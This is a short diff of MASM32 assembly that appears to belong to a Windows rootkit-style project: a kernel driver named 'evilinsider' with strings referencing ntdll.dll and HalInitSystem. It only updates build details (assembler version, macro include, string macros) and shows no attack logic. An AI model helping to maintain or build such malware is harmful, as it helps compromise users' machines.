@@ -7,7 +7,7 @@
 ; 	- David Reguera Garcia aka Dreg dreg@fr33project.org https://www.fr33project.org
 ;
 
-; masm32 (m32v9r, MASM32 9.0 version)
+; masm32 (masm32v11r, MASM32 11 version) https://www.masm32.com/download.htm
 
 
 .586 ; rdtsc...                                    
@@ -17,7 +17,7 @@ option casemap :none
 include \masm32\include\windows.inc          
 include \masm32\include\user32.inc
 include \masm32\include\kernel32.inc         
-include \masm32\macros\ucmacros.asm
+include \masm32\macros\macros.asm
         
 includelib \masm32\lib\user32.lib
 includelib \masm32\lib\kernel32.lib
@@ -2416,9 +2416,9 @@ ring3_end:
         drv_desc            db  "evilinsider",0h
         systemroot          db  "windows"
         exe_ext             db  ".exe"
-        WSTR                ufpath_ntdll, "\??\C:\Windows\System32\ntdll.dll"
-        WSTR                hal_api_uname, "HalInitSystem"
-        WSTR                hal_uname, "hal.dll"
+        UCSTR               ufpath_ntdll, "\??\C:\Windows\System32\ntdll.dll", 0
+        UCSTR               hal_api_uname, "HalInitSystem", 0
+        UCSTR               hal_uname, "hal.dll", 0
  
 drvcode_end:
 drv_end:
